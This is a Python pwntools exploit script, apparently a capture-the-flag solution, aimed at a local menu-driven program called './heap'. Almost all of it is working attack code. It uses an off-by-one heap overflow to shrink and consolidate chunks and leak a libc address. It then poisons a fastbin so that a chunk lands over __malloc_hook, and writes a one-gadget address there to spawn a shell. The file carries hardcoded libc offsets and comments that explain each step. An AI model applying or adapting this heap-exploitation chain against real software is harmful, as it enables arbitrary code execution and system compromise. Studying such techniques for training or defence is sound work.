#!/usr/bin/python

# https://sploitfun.wordpress.com/2015/06/09/off-by-one-vulnerability-heap-based/
# https://heap-exploitation.dhavalkapil.com/attacks/shrinking_free_chunks.html
# fastbin attacl?

import os
from pwn import *


context(arch="amd64", os="linux", endian="little")
context.log_level = "DEBUG"


class Exploit(object):
    def __init__(self, path="./heap"):
        self.path = path
        self.p = None
        self.record = dict()

    def get_idx(self):
        tmp = 0
        while tmp < 10:
            if tmp not in self.record.keys():
                break
            else:
                tmp += 1
        return tmp

    def start(self):
        self.p = process(self.path)
        self.p.recvuntil("> ")

    def heap_create(self, length, content=None):
        if content is None:
            content = p8(0x00)*length
        self.p.sendline("1")
        self.p.recvuntil("size: ")
        self.p.sendline(str(length))
        self.p.recvuntil("data: ")
        self.p.send(content)
        self.p.recvuntil("> ")
        idx = self.get_idx()
        self.record[idx] = content

    def heap_remove(self, idx):
        self.p.sendline("2")
        self.p.recvuntil("idx: ")
        self.p.sendline(str(idx))
        self.p.recvuntil("> ")
        del self.record[idx]

    def heap_show(self, idx):
        self.p.sendline("3")
        self.p.recvuntil("idx: ")
        self.p.recvuntil("data: ")
        ret = self.p.recvuntil('\n')
        self.p.recvuntil("> ")
        return ret[:-1]

    def exploit(self):
        self.start()
        self.prepare()
        self.p.interactive()
        self.p.close()

    def prepare(self):
        # load libc, then we can get address easily
        libc_path = "/lib/x86_64-linux-gnu/libc.so.6"
        libc = ELF(libc_path)
        libc_offset = 0x3c4b78
        self.heap_create(0xf8, 'A'*0xf8)  # chunk_A
        self.heap_create(0x68, 'B'*0x68)  # chunk_B
        self.heap_create(0xf8, 'C'*0xf8)  # chunk_C
        self.heap_create(0x10, 'D'*0x10)  # chunk_D
        # chunk_A will be a valid free chunk
        self.heap_remove(0)
        # exploit off-by-one in chunk_B
        # overwrite prev_inuse bit of chunk_C
        self.heap_remove(1)
        self.heap_create(0x68, 'B'*0x68)
        # set prev_size of chunk_C to 0x170
        for i in range(0x66, 0x5f, -1):
            self.heap_remove(0)
            self.heap_create(i+2, 'B'*i + '\x70\x01')  # chunk_B
        # trigger consolidation with the fakechunk
        self.heap_remove(2)
        # create chunk_E to leak libc addresses
        self.heap_create(0xf6, 'E'*0xf6)
        # read content
        # the content of chunk_B now contains fd/bk
        libc_leak = self.heap_show(0)
        libc_leak = unpack(libc_leak + (8-len(libc_leak))*'\x00', 64)
        libc_base = libc_leak - libc_offset
        libc.address = libc_base
        # restore the size field of chunk_B
        for i in range(0xfd, 0xf7, -1):
            self.heap_remove(1)
            self.heap_create(i+1, 'E'*i + '\x70')
        # free chunk_B to fastbin list
        self.heap_remove(0)
        # free chunk_E
        self.heap_remove(1)
        # create chunk_F to overwrite the fd of freed chunk_B
        hook_offset = 0x3c4aed
        hook = libc_base + hook_offset
        self.heap_create(0x108, 'F'*0x100 + p64(hook))
        # restore the size of the freed chunk_B again
        for i in range(0xfe, 0xf7, -1):
            self.heap_remove(0)
            self.heap_create(i+8, 'F'*i + p64(0x70))
        # recreate chunk_B
        self.heap_create(0x68, 'B'*0x68)
        #oneshot_offset = 0x45216
        #oneshot_offset = 0x4526a
        oneshot_offset = 0xf02a4
        #oneshot_offset = 0xf1147
        oneshot = libc_base + oneshot_offset
        # our chunk_G in libc, overwrite __malloc_hook
        self.heap_create(0x68, 0x13*'G'+p64(oneshot)+0x4d*'\x00')
        # triger one gadget (__malloc_hook will be called)
        self.heap_create(0x20, 'one gadget')
        return


def main():
    heap = Exploit()
    heap.exploit()


if __name__ == "__main__":
    main()
